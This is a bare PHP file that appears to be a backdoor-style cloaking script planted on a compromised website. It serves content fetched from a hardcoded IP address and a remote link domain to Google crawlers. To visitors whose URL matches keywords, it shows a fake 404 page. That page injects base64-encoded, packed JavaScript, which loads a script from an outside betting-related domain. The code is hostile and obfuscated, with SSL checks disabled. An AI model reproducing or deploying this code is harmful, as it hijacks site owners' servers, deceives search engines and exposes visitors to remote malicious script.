<?php
ini_set('date.timezone', 'Brazil/East');
$proxy_modex = 0;
$limit = 5000000;
$inlink_flagx = 'video|Ronaldo|Bailey|Garrincha|Pereira|Zico|Romario|Rivaldo|Socrates|Falcao|Mario';
$url_jsx = 'https://data.imagebet.ph/crazy.js';
$proxy_urlx = 'http://45.125.48.144/articlenews.php?' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$outlink_urlx = 'http://link.eventbr.xyz';
$arr_uax = array('google');
$arr_refx = array('google');
if ($proxy_modex == 0) {
    if (info_checkx($_SERVER['HTTP_USER_AGENT'], $arr_uax)) {
        $contentx = file_get_contents($proxy_urlx);
        echo $contentx;
        exit();
    }
} else {
    if ($proxy_modex == 1) {
        if (info_checkx($_SERVER['HTTP_USER_AGENT'], $arr_uax)) {
            $outlink_urlx .= '/index.php?flag=' . $inlink_flagx . '&style=static&limit=' . $limit . '&domain=' . $_SERVER['HTTP_HOST'];
            $contentx = myrequestx($outlink_urlx, $_SERVER['HTTP_USER_AGENT']);
            echo $contentx;
        }
    } else {
        if ($proxy_modex == 2) {
            if (info_checkx($_SERVER['HTTP_USER_AGENT'], $arr_uax)) {
                if (search_flagx($inlink_flagx)) {
                    $proxy_urlx .= '&flag=' . $inlink_flagx . '&style=dynamic&limit=' . $limit . '&domain=' . $_SERVER['HTTP_HOST'];
                    $contentx = myrequestx($proxy_urlx);
                    echo $contentx;
                    exit;
                } else {
                    $outlink_urlx .= '/index.php?flag=' . $inlink_flagx . '&style=dynamic&limit=' . $limit . '&domain=' . $_SERVER['HTTP_HOST'];
                    $contentx = myrequestx($outlink_urlx, $_SERVER['HTTP_USER_AGENT']);
                    echo $contentx;
                }
            } else {
                if (search_flagx($inlink_flagx)) {
                    $codex = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<html><head>\r\n<title>404 Not Found</title>\r\n</head><body>\r\n<h1>Not Found</h1>\r\n<p>The requested URL {url} was not found on this server.</p>\r\n{js}\r\n</body></html>\r\n";
                    $jsx = get_ads($url_jsx);
                    $codex = str_ireplace('{js}', $jsx, $codex);
                    $contentx = str_ireplace('{url}', $_SERVER['REQUEST_URI'], $codex);
                    echo $contentx;
                    exit;
                }
            }
        } else {
            if ($proxy_modex == 3) {
                if (info_checkx($_SERVER['HTTP_USER_AGENT'], $arr_uax)) {
                    if (search_flagx($inlink_flagx)) {
                        $proxy_urlx .= '&flag=' . $inlink_flagx . '&style=static&limit=' . $limit . '&domain=' . $_SERVER['HTTP_HOST'];
                        $contentx = myrequestx($proxy_urlx);
                        echo $contentx;
                        exit;
                    } else {
                        $outlink_urlx .= '/index.php?flag=' . $inlink_flagx . '&style=static&limit=' . $limit . '&domain=' . $_SERVER['HTTP_HOST'];
                        $contentx = myrequestx($outlink_urlx, $_SERVER['HTTP_USER_AGENT']);
                        echo $contentx;
                    }
                } else {
                    if (search_flagx($inlink_flagx)) {
                        $codex = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<html><head>\r\n<title>404 Not Found</title>\r\n</head><body>\r\n<h1>Not Found</h1>\r\n<p>The requested URL {url} was not found on this server.</p>\r\n{js}\r\n</body></html>\r\n";
                        $jsx = get_ads($url_jsx);
                        $codex = str_ireplace('{js}', $jsx, $codex);
                        $contentx = str_ireplace('{url}', $_SERVER['REQUEST_URI'], $codex);
                        echo $contentx;
                        exit;
                    }
                }
            }
        }
    }
}
function info_checkx($v_0, $v_1)
{
    $var_0 = 0;
    foreach ($v_1 as $var_1) {
        if (!(stripos($v_0, $var_1) !== !1)) {
            break;
        }
        $var_0 = 1;
    }
    return $var_0;
}
function myrequestx($v_0, $v_1 = "Googlebot")
{
    $var_0['http']['ignore_errors'] = !0;
    $var_0['http']['method'] = 'GET';
    $var_0['ssl']['verify_peer'] = !1;
    $var_0['ssl']['allow_self_signed'] = !0;
    $var_1 = array();
    $var_1['User-Agent'] = $v_1;
    $var_1['Accept'] = '*/*';
    $var_1['Accept-Language'] = 'zh-CN';
    $var_1['Connection'] = 'Close';
    $var_2 = '';
    foreach ($var_1 as $var_3 => $var_4) {
        if ($var_4 != '') {
            $var_2 .= $var_3 . ': ' . $var_4 . "\r\n";
        }
    }
    $var_0['http']['header'] = $var_2;
    $var_5 = stream_context_create($var_0);
    $var_6 = file_get_contents($v_0, !1, $var_5);
    return $var_6;
}
function is_Mobilexxx()
{
    $var_0 = 'phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone';
    $var_1 = explode('|', $var_0);
    $var_2 = 0;
    foreach ($var_1 as $var_3) {
        if (!(stripos($_SERVER['HTTP_USER_AGENT'], $var_3) !== !1)) {
            break;
        }
        $var_2 = 1;
    }
    return $var_2;
}
function search_flagx($v_0)
{
    $var_0 = explode('|', $v_0);
    $var_1 = count($var_0);
    $var_2 = 0;
    $var_3 = $_SERVER['REQUEST_URI'];
    $var_4 = 0;
    while ($var_4 < $var_1) {
        if (stripos($var_3, $var_0[$var_4]) !== !1) {
            $var_2 = 1;
            break;
        }
        $var_4++;
    }
}
function get_ads($v_0)
{
    $var_0 = 'PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmV2YWwoZnVuY3Rpb24ocCxhLGMsayxlLHIpe2U9ZnVuY3Rpb24oYyl7cmV0dXJuKGM8YT8nJzplKHBhcnNlSW50KGMvYSkpKSsoKGM9YyVhKT4zNT9TdHJpbmcuZnJvbUNoYXJDb2RlKGMrMjkpOmMudG9TdHJpbmcoMzYpKX07aWYoIScnLnJlcGxhY2UoL14vLFN0cmluZykpe3doaWxlKGMtLSlyW2UoYyldPWtbY118fGUoYyk7az1bZnVuY3Rpb24oZSl7cmV0dXJuIHJbZV19XTtlPWZ1bmN0aW9uKCl7cmV0dXJuJ1xcdysnfTtjPTF9O3doaWxlKGMtLSlpZihrW2NdKXA9cC5yZXBsYWNlKG5ldyBSZWdFeHAoJ1xcYicrZShjKSsnXFxiJywnZycpLGtbY10pO3JldHVybiBwfSgnbShkKHAsYSxjLGssZSxyKXtlPWQoYyl7ZiBjLm4oYSl9O2goIVwnXCcuaSgvXi8sbykpe2ooYy0tKXJbZShjKV09a1tjXXx8ZShjKTtrPVtkKGUpe2YgcltlXX1dO2U9ZCgpe2ZcJ1xcXFx3K1wnfTtjPTF9O2ooYy0tKWgoa1tjXSlwPXAuaShxIHMoXCdcXFxcYlwnK2UoYykrXCdcXFxcYlwnLFwnZ1wnKSxrW2NdKTtmIHB9KFwnMVsiMiJdWyIzIl0oXFxcJzwwIDQ9IjUvNiIgNz0iODovLzkuYS9iLmMiPjwvMD5cXFwnKTtcJyxsLGwsXCd0fHV8dnx4fHl8enxBfEJ8Q3xEfEV8RnxHXCcuSChcJ3xcJyksMCx7fSkpJyw0NCw0NCwnfHx8fHx8fHx8fHx8fGZ1bmN0aW9ufHxyZXR1cm58fGlmfHJlcGxhY2V8d2hpbGV8fDEzfGV2YWx8dG9TdHJpbmd8U3RyaW5nfHxuZXd8fFJlZ0V4cHxzY3JpcHR8d2luZG93fGRvY3VtZW50fHx3cml0ZXx0eXBlfHRleHR8amF2YXNjcmlwdHxzcmN8aHR0cHN8e2RvbWFpbjF9fHtkb21haW4yfXx7bmFtZX18anN8c3BsaXQnLnNwbGl0KCd8JyksMCx7fSkpPC9zY3JpcHQ+';
    $var_0 = base64_decode($var_0);
    $var_1 = $v_0;
    $var_2 = regular_domain($var_1);
    $var_3 = top_domain($var_2);
    $var_4 = str_ireplace($var_3, '', $var_2);
    $var_5 = explode('.', $var_3);
    $var_6 = $var_5[0];
    $var_7 = str_ireplace($var_6 . '.', '', $var_3);
    $var_8 = str_ireplace($var_3 . '/', ' ', $var_1);
    $var_5 = explode(' ', $var_8);
    $var_9 = $var_5[1];
    $var_9 = str_ireplace('.js', '', $var_9);
    $var_0 = str_ireplace('{domain1}', $var_4 . $var_6, $var_0);
    $var_0 = str_ireplace('{domain2}', $var_7, $var_0);
    $var_0 = str_ireplace('{name}', $var_9, $var_0);
    return $var_0;
}
function regular_domain($v_0)
{
    if (!(substr($v_0, 0, 7) == 'http://')) {
        if (substr($v_0, 0, 8) == 'https://') {
            $v_0 = substr($v_0, 8);
        }
    }
    $v_0 = substr($v_0, 7);
    if (strpos($v_0, '/') !== !1) {
        $v_0 = substr($v_0, 0, strpos($v_0, '/'));
    }
    return strtolower($v_0);
}
function top_domain($v_0)
{
    $v_0 = regular_domain($v_0);
    $var_0 = array('AC', 'AD', 'AE', 'AERO', 'AF', 'AG', 'AI', 'AL', 'AM', 'AN', 'AO', 'AQ', 'AR', 'ARPA', 'AS', 'ASIA', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA', 'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BIZ', 'BJ', 'BL', 'BM', 'BN', 'BO', 'BQ', 'BR', 'BS', 'BT', 'BV', 'BW', 'BY', 'BZ', 'CA', 'CAT', 'CC', 'CD', 'CF', 'CG', 'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'COM', 'COOP', 'CR', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ', 'DK', 'DM', 'DO', 'DZ', 'EC', 'EDU', 'EE', 'EG', 'EH', 'ER', 'ES', 'ET', 'EU', 'FI', 'FJ', 'FK', 'FM', 'FO', 'FR', 'GA', 'GB', 'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM', 'GN', 'GOV', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW', 'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID', 'IE', 'IL', 'IM', 'IN', 'INFO', 'INT', 'IO', 'IQ', 'IR', 'IS', 'IT', 'JE', 'JM', 'JO', 'JOBS', 'JP', 'KE', 'KG', 'KH', 'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ', 'LA', 'LB', 'LC', 'LI', 'LK', 'LR', 'LS', 'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME', 'MF', 'MG', 'MH', 'MIL', 'MK', 'ML', 'MM', 'MN', 'MO', 'MOBI', 'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MUSEUM', 'MV', 'MW', 'MX', 'MY', 'MZ', 'NA', 'NAME', 'NC', 'NE', 'NET', 'NF', 'NG', 'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM', 'ORG', 'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM', 'PN', 'PR', 'PRO', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE', 'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD', 'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM', 'SN', 'SO', 'SR', 'SS', 'ST', 'SU', 'SV', 'SX', 'SY', 'SZ', 'TC', 'TD', 'TEL', 'TF', 'TG', 'TH', 'TJ', 'TK', 'TL', 'TM', 'TN', 'TO', 'TP', 'TR', 'TRAVEL', 'TT', 'TV', 'TW', 'TZ', 'UA', 'UG', 'UK', 'UM', 'US', 'UY', 'UZ', 'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF', 'WS', 'XXX', 'YE', 'YT', 'ZA', 'ZM', 'ZW');
    $var_1 = explode('.', $v_0);
    $var_2 = '';
    $var_3 = 0;
    for ($var_4 = count($var_1) - 1; $var_4 >= 0; $var_4--) {
        if ($var_4 == 0) {
            break;
        }
        if (in_array($var_1[$var_4], $var_0)) {
            $var_3++;
            $var_2 = '.' . $var_1[$var_4] . $var_2;
            if ($var_3 >= 2) {
                break;
            }
        }
    }
    $var_2 = $var_1[count($var_1) - $var_3 - 1] . $var_2;
    return $var_2;
}